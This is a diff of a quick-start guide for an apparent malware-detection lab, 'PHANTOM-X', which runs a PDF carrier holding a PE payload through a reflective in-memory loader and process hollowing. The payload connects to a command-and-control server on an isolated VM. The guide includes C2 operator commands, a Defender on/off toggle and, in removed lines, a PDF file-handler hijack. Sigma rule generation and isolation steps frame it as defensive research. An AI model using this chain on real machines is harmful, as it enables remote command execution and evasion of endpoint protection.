@@ -1,8 +1,6 @@
 ================================================================================
 PHANTOM-X :: WINDOWS 11 PRO -- QUICK START
 ================================================================================
-
-KYA YE HAI
     Research lab for the chain:
         PDF -> embedded PE -> in-memory mapping -> execution -> C2
     Runs on a personally owned, isolated Windows 11 Pro VM.
@@ -11,74 +9,125 @@ KYA YE HAI
 
 
 --------------------------------------------------------------------------------
-STEP 0 -- KALI (attacker/operator machine) : start the C2
+STEP 0 -- ISOLATE THE VM (BEFORE ANYTHING ELSE)
 --------------------------------------------------------------------------------
-    cd /home/syco/phantom-x/phase5_network
-    python3 c2_server.py --host 0.0.0.0 --port 9001 --log c2_audit.jsonl
+    The payload runs arbitrary commands inside the VM. The network lockdown
+    is the control that contains that risk, so it goes in BEFORE the payload
+    is on the machine. Locking it down afterwards is a statement of intent;
+    locking it down first is a control.
 
-    NOTE the IP Kali printed. The VM needs it. Find it with:
-        ip -4 addr show | grep -oP 'inet \K[\d.]+'
+    ON THE HOST (the machine that runs the C2):
+
+        cd phantom-x\phase0_labnet
+        .\setup_labnet.ps1 -Action apply -LabSubnet 192.168.77.0/24 -C2Port 9001
+
+    ON THE VM:
+
+        cd C:\pxvm\phase0_labnet
+        .\setup_vm_labnet.ps1 -LabGateway 192.168.77.1 -C2Port 9001
+        .\verify_labnet.ps1 -LabGateway 192.168.77.1 -C2Port 9001
+
+    The verification must report PASS on all four checks. If HOME-1 or
+    HOME-2 passes (meaning the home network IS reachable), stop and fix it
+    before going further.
+
+    NOTE: the VM will have NO INTERNET afterwards. That is deliberate.
+    Install anything you need from the host, over the lab segment, first.
+
+
+--------------------------------------------------------------------------------
+STEP 1 -- HOST: build everything
+--------------------------------------------------------------------------------
+    cd phantom-x\phase3_fileless\loader
+    .\build_all.ps1 -C2Host 192.168.77.1 -C2Port 9001
+
+    Builds:
+        px_payload.exe   freestanding C, reflectively loadable
+        px_loader.exe    C, PDF extractor + reflective PE mapper
+        px_hollow.exe    C, PDF extractor + remote process mapper
+        px_c2.exe        Go, the lab C2 server
+        px_pdfscan.exe   Rust, the independent PDF scanner
+        px_detect.exe    Rust, the detection rule generator
+        px_attack_chain.pdf  the carrier PDF
+
+    It also runs the payload's formatter self-test. If that reports FAIL,
+    stop: a formatter bug shows up as a wrong exit code at the far end of
+    a C2 session, which is a long way from the cause.
+
+    COPY C:\pxvm\ TO THE VM:  px_loader.exe, px_payload.exe, px_hollow.exe,
+    px_attack_chain.pdf, the .ps1 scripts, px_c2.exe, px_pdfscan.exe,
+    px_detect.exe.
+
+
+--------------------------------------------------------------------------------
+STEP 2 -- HOST: start the C2
+--------------------------------------------------------------------------------
+    cd phantom-x\phase5_network
+    ..\dist\native\px_c2.exe --host 192.168.77.1 --port 9001 --log c2_audit.jsonl
+
+    Bind to the LAB address (192.168.77.1), not 0.0.0.0. The host firewall
+    rules from step 0 already block everything else from the lab subnet,
+    but binding to the specific interface is the first line of defence.
 
     LEAVE THIS TERMINAL OPEN. It is the operator console.
 
-
---------------------------------------------------------------------------------
-STEP 1 -- VM : get the files across
---------------------------------------------------------------------------------
-    Option A -- USB / shared folder:
-        Copy the whole phantom-x-vm-lab folder to C:\pxvm\
-
-    Option B -- scp from Kali:
-        scp -r phantom-x-vm-lab user@<VM-IP>:C:/pxvm/
-
-    Result: C:\pxvm\ containing px_loader.exe, px_payload.exe, px_hollow.exe,
-            px_attack_chain.pdf, the .ps1 scripts and the .py files.
+    Commands:
+        list                 show sessions
+        exec 1 whoami        run a command in session 1
+        exec all ver         run a command in every session
+        ping 1               measure round trip latency
+        kill 1               terminate a session cleanly
+        stats                counters and audit log path
+        quit                 stop the server
 
 
 --------------------------------------------------------------------------------
-STEP 2 -- VM : can the VM reach Kali?
+STEP 3 -- VM: prepare
+--------------------------------------------------------------------------------
+    cd C:\pxvm\phase4_defender
+    .\vm_prepare.ps1 -LabFolder C:\pxvm -LabGateway 192.168.77.1 -C2Port 9001
+
+    It does, in order:
+      1. network lockdown (unless -SkipNetwork)
+      2. reports the Defender posture -- it does NOT change it
+      3. removes Mark-of-the-Web from the lab files
+      4. creates the report directories
+      5. checks that Sysmon is installed
+
+    If it reports that Tamper Protection is ON, note it: the Defender A/B
+    toggle cannot change settings while it is on, so turn it off in
+    Windows Security before you need the A/B.
+
+
+--------------------------------------------------------------------------------
+STEP 4 -- VM: can the VM reach the C2?
 --------------------------------------------------------------------------------
     In an elevated PowerShell on the VM:
-        Test-NetConnection -ComputerName <KALI-IP> -Port 9001
+
+        Test-NetConnection -ComputerName 192.168.77.1 -Port 9001
 
     Expect: TcpTestSucceeded : True
-    If False -> the VM's NIC is in NAT mode. Change it to host-only or
-    bridged in the hypervisor, then retest.
-
-    Firewall on Kali (if it blocks the VM):
-        sudo ufw allow from <VM-IP> to any port 9001 proto tcp
+    If False -> the VM's NIC is not on the host-only segment. Fix it in the
+    hypervisor (VMware: VMnet1 = Host-only; Hyper-V: attach to PX-LAB).
 
 
 --------------------------------------------------------------------------------
-STEP 3 -- VM : prepare (execution policy + unblock)
+STEP 5 -- VM: capture the BEFORE state
 --------------------------------------------------------------------------------
     cd C:\pxvm
-    .\setup_vm.ps1 -LabFolder C:\pxvm
+    .\collect_defender.ps1 -Label before_chain
 
-    Fixes the "not digitally signed" error, reports the Defender posture,
-    and creates the reports folder.
-    It prints everything it changed.
-
-    If it complains that Tamper Protection is on, note it -- the Defender A/B
-    step will not be possible until that is turned off.
-
-
---------------------------------------------------------------------------------
-STEP 4 -- VM : capture the BEFORE state
---------------------------------------------------------------------------------
-    .\collect_defender.ps1 -Label before_run1
-
-    STOP CONDITION: open reports\before_run1_defender_status.json and confirm
+    STOP CONDITION: open reports\before_chain_defender_status.json and confirm
     "RealTimeProtectionEnabled": true
     If it is false -> fix it before continuing. Everything the report claims
     about Defender depends on it being on.
 
 
 --------------------------------------------------------------------------------
-STEP 5 -- VM : run the chain
+STEP 6 -- VM: run the chain
 --------------------------------------------------------------------------------
     cd C:\pxvm
-    $env:PX_C2_HOST = "<KALI-IP>"
+    $env:PX_C2_HOST = "192.168.77.1"
     $env:PX_C2_PORT = "9001"
     .\px_loader.exe .\px_attack_chain.pdf .\loader.log
 
@@ -88,159 +137,81 @@ STEP 5 -- VM : run the chain
     Expected in loader.log:
         [loader] embedded file: inflated bytes (encoded flate)
         [loader] PE: machine=0x8664 ...
-        [loader] mapped at preferred base ...
-        [loader] resolved 31 import(s)
-        [loader] calling entry point ...
-        [px] connecting to <KALI-IP>:9001
-        [px] connected
 
-    Nothing is written to disk for the payload. It is extracted from the PDF
-    straight into memory and executed there.
+    The HOST console should now show:
+        [+] session 1 connected from 192.168.77.x
+        [*] session 1 hello: host=... arch=x64 pid=...
 
+    Try:
+        exec 1 whoami
+        exec 1 cmd /c echo PHANTOM_X_CHAIN_PROOF
 
---------------------------------------------------------------------------------
-STEP 6 -- KALI : drive it
---------------------------------------------------------------------------------
-    In the OTHER terminal, where c2_server.py is running:
-        c2> list
-        c2> exec 1 whoami
-        c2> exec 1 cmd /c ver
-        c2> exec 1 cmd /c tasklist
-        c2> ping 1
-        c2> kill 1
-
-    Command reference:
-        list                 show sessions
-        exec <id|all> <cmd>  run a command
-        ping <id|all>        measure round-trip latency
-        kill <id|all>        send EXIT (controlled termination)
-        stats                counters and audit log path
-        help                 full list
-        quit                 stop the server
-
-    Everything is recorded in c2_audit.jsonl on Kali.
+    The exit code should be a NUMBER (0), not the text "%ld". If you see
+    "%ld", the payload is a stale binary -- rebuild it.
 
 
 --------------------------------------------------------------------------------
-STEP 7 -- VM : capture the AFTER state
+STEP 7 -- VM: capture the AFTER state
 --------------------------------------------------------------------------------
-    Open a SECOND PowerShell on the VM (the first one is still busy):
-        cd C:\pxvm
-        .\collect_defender.ps1 -Label after_run1
+    .\collect_defender.ps1 -Label after_chain
 
-    Then stop the loader: Ctrl+C in the first terminal.
+    Then, if you want the documented coverage gap:
+        .\lab_ab_toggle.ps1 -Action off
+        # ... run the chain again ...
+        .\lab_ab_toggle.ps1 -Action on
 
-
---------------------------------------------------------------------------------
-STEP 8 -- VM (optional) : run it INSIDE another process
---------------------------------------------------------------------------------
-    .\px_hollow.exe "C:\Windows\System32\notepad.exe" .\px_attack_chain.pdf
-
-    Same chain, but the payload runs INSIDE notepad: notepad's original
-    image is unmapped, the payload is mapped in its place, and the payload
-    runs on a thread inside that process. The C2 session's pid will be
-    notepad's pid, not px_hollow.exe's.
-
-    Test it end to end:
-        python test_hollow_integration.py
+    The toggle arms a restore guard before it changes anything, so the VM
+    cannot be left unprotected even if the process is killed.
 
 
 --------------------------------------------------------------------------------
-STEP 9 -- VM (optional) : the Defender A/B arm
+STEP 8 -- CROSS-VALIDATE (on the host)
 --------------------------------------------------------------------------------
-    Turn the whole Microsoft security stack off:
-        .\lab_disable_microsoft_security.ps1 -Action disable -AddLabExclusions -LabFolder C:\pxvm
+    python3 phase1_pdf/validate_cross_impl.py \
+        --rust dist/native/px_pdfscan.exe --samples phase1_pdf/samples
 
-    That disables real-time protection, behaviour monitoring, IOAV, SCRIPT
-    SCANNING (which is what engages AMSI), archive scanning, PUA protection,
-    controlled folder access, network protection and SmartScreen.
+    python3 phase5_network/validate_c2_equivalence.py \
+        --go dist/native/px_c2.exe
 
-    A scheduled task re-arms the restore in 2 minutes, so the VM cannot be
-    left undefended by accident.
-
-    Repeat steps 5-7 with a different label:
-        .\run_chain_on_vm.ps1 -KaliHost <KALI-IP> -KaliPort 9001 -Label run1_off
-
-    RESTORE (do not skip):
-        .\lab_disable_microsoft_security.ps1 -Action restore
-
-    The comparison between run1 and run1_off is the actual experiment.
+    Both must report PASS. They compare two independent implementations of
+    the same thing, which is how the bugs that have already been found in
+    this codebase were found at all.
 
 
 --------------------------------------------------------------------------------
-STEP 10 -- VM (optional) : double-click the PDF, nothing else
+STEP 9 -- WHAT THE DETECTOR SEES
 --------------------------------------------------------------------------------
-    IMPORTANT: do this LAST. If the handler is installed first, the reader
-    never opens and you will wrongly conclude the reader blocked the file.
+    On the HOST:
 
-    \install_pdf_handler.ps1 -LoaderPath C:\pxvm\px_loader.exe
+        dist\native\px_detect.exe --list
+        dist\native\px_detect.exe --explain px-003
+        dist\native\px_detect.exe --emit sigma > detections.yml
 
-    Now double-click any .pdf in Explorer. No console, no prompt: the loader
-    runs against it.
-
-    Verify the association:
-        Get-ItemProperty "HKCU:\Software\Classes\.pdf" | Select-Object "(default)"
-
-    If your PDF reader still opens instead, Windows has a UserChoice entry
-    that overrides registry associations. The installer removes it, but if
-    you had chosen a default app in Settings, re-pick it afterwards.
-
-    Remove the handler:
-        .\install_pdf_handler.ps1 -Uninstall
+    The Sigma rules are the deliverable that outlives the lab. They key on
+    what is observable, because a payload that evades produces no signal to
+    analyse, which would defeat the purpose of the detection study.
 
 
---------------------------------------------------------------------------------
-STEP 11 -- collect and send back
---------------------------------------------------------------------------------
-    From the VM:
-        C:\pxvm\reports\before_run1_summary.json
-        C:\pxvm\reports\after_run1_summary.json
-        C:\pxvm\loader_run1.log
-    From Kali:
-        c2_audit.jsonl
-
-    Plus these four facts:
-        reader product + version          Help > About
-        Defender version                  Get-MpComputerStatus | Select AMProductVersion
-        did Defender alert? (event ID)    from the before/after summaries
-        Sysmon event IDs seen             1 process, 3 network, 11 file, 22 DNS
-
-
---------------------------------------------------------------------------------
-TROUBLESHOOTING
---------------------------------------------------------------------------------
-  [px] connect failed (10061)
-      The C2 is not running on Kali, or a firewall is blocking it.
-      Check:  sudo ufw allow from <VM-IP> to any port 9001 proto tcp
-
-  Test-NetConnection says False
-      The VM is in NAT mode. Switch it to host-only / bridged.
-
-  "not digitally signed"
-      Get-ChildItem C:\pxvm -Recurse -File | Unblock-File
-      or run setup_vm.ps1 (it does this).
-
-  c2> list shows "no sessions"
-      The VM side never connected. Read loader.log.
-
-  "ABORTED: Real-Time Protection is OFF"
-      run_chain_on_vm.ps1 refuses to run undefended by default.
-      Turn Defender on, or use -AllowDefenderOff for a deliberate A/B arm.
-
-  The loader exits immediately with no output
-      Run it from the folder containing px_attack_chain.pdf, or give the
-      full path to the PDF.
-
-  Nothing happens when a PDF is double-clicked
-      Check HKCU\Software\Classes\.pdf and the UserChoice key. See STEP 10.
-
-
---------------------------------------------------------------------------------
-SAFETY
---------------------------------------------------------------------------------
-  * The C2 must stay on the isolated lab network. Never expose it publicly.
-  * The payload has NO persistence. A reboot ends the session. Deliberate.
-  * The payload only ever affects its own process.
-  * Restore Defender after the A/B arm. The before/after snapshots are the
-    evidence that it was on during the measured runs.
 ================================================================================
+WHAT IS NOT IN THIS LAB, AND WHY
+================================================================================
+    No obfuscation. No AMSI bypass. No ETW unhooking. No encrypted channel.
+    No domain generation. No persistence. No credential access. No lateral
+    movement.
+
+    Two reasons.
+
+    The first is scope. The payload only ever affects its own process.
+
+    The second is method. A payload that evades produces no signal to
+    analyse, which would defeat the purpose of a detection study. Every
+    detection rule here keys on something observable. If the payload
+    started hiding, the rules would stop firing and the measurement would
+    become a claim rather than a result.
+
+    On "send a PDF to someone and their machine runs it": that requires
+    code on the RECIPIENT's machine (a file-association handler, or a
+    reader that honours /Launch, which Acrobat disabled in 2018 and Edge
+    never honoured). It is not something a sender can do on their own. The
+    lab measures what happens on a machine you control, which is both
+    possible and scientifically valid.
